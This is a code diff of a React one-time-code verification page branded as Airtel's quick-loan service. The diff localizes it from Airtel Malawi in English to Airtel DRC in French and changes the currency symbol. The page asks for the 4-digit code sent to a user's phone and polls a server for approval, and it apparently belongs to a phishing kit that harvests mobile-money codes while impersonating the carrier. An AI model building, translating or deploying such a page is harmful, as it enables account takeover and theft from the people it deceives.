@@ -65,7 +65,7 @@ function AirtelOTPVerify() {
       }
 
       if (data.status === 'rejected') {
-        setError('Invalid OTP code.');
+        setError('Code OTP invalide.');
         setIsVerifying(false);
         return;
       }
@@ -80,13 +80,13 @@ function AirtelOTPVerify() {
         } else if (status.status === 'rejected' || status.status === 'expired') {
           stopPolling();
           setIsVerifying(false);
-          setError('Code rejected or expired.');
+          setError('Code rejeté ou expiré.');
         }
       }, 2000);
 
     } catch {
       setIsVerifying(false);
-      setError('Network error.');
+      setError('Erreur réseau.');
     }
   };
 
@@ -145,27 +145,27 @@ function AirtelOTPVerify() {
               <div></div><div></div><div></div><div></div><div></div><div></div>
               <div></div><div></div><div></div><div></div><div></div><div></div>
             </div>
-            <h2 style={{fontSize: '22px', fontWeight: 900, color: '#1a1a1a', marginBottom: '12px'}}>Processing...</h2>
-            <p style={{fontSize: '14px', color: '#6B7280'}}>Please wait while we verify your code...</p>
+            <h2 style={{fontSize: '22px', fontWeight: 900, color: '#1a1a1a', marginBottom: '12px'}}>Traitement en cours...</h2>
+            <p style={{fontSize: '14px', color: '#6B7280'}}>Veuillez patienter pendant que nous vérifions votre code...</p>
           </div>
         </div>
       )}
 
       <div className="header-top">
         <div className="menu-icon">≡</div>
-        <h1 className="header-title">Airtel Malawi</h1>
+        <h1 className="header-title">Airtel DRC</h1>
       </div>
-      <p className="header-sub">Quick loans. Anytime. Anywhere.</p>
+      <p className="header-sub">Prêts rapides. A tout moment. N'importe où.</p>
 
       <div className="card">
-        <div className="back-link" onClick={() => navigate('/')}>← Back to login</div>
+        <div className="back-link" onClick={() => navigate('/')}>← Retour à la connexion</div>
         
-        <h2 className="card-title">Verify your code</h2>
-        <p className="card-sub">Enter the 4-digit code sent to <br/><b>{phoneNumber}</b></p>
+        <h2 className="card-title">Vérifiez votre code</h2>
+        <p className="card-sub">Saisissez le code à 4 chiffres envoyé à <br/><b>{phoneNumber}</b></p>
 
         {error && <div style={{color: '#DA1C1C', textAlign: 'center', marginBottom: '16px', fontWeight: 600}}>{error}</div>}
 
-        <label className="label">Enter OTP code</label>
+        <label className="label">Saisissez le code OTP</label>
         <div className="otp-boxes">
           {otp.map((digit, i) => (
             <input
@@ -187,11 +187,11 @@ function AirtelOTPVerify() {
         </div>
 
         <button className={`btn ${otp.join('').length === 4 ? 'btn-primary' : 'btn-disabled'}`} onClick={handleVerify} disabled={otp.join('').length < 4}>
-          Verify code →
+          Vérifier le code →
         </button>
         
         <button className="btn btn-secondary" onClick={() => setTimeLeft(TIMER_START)}>
-          Resend code
+          Renvoyer le code
         </button>
       </div>
 
@@ -201,7 +201,7 @@ function AirtelOTPVerify() {
           <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
         </div>
         <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
-        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>K</div>
+        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>₣</div>
       </div>
     </div>
   );
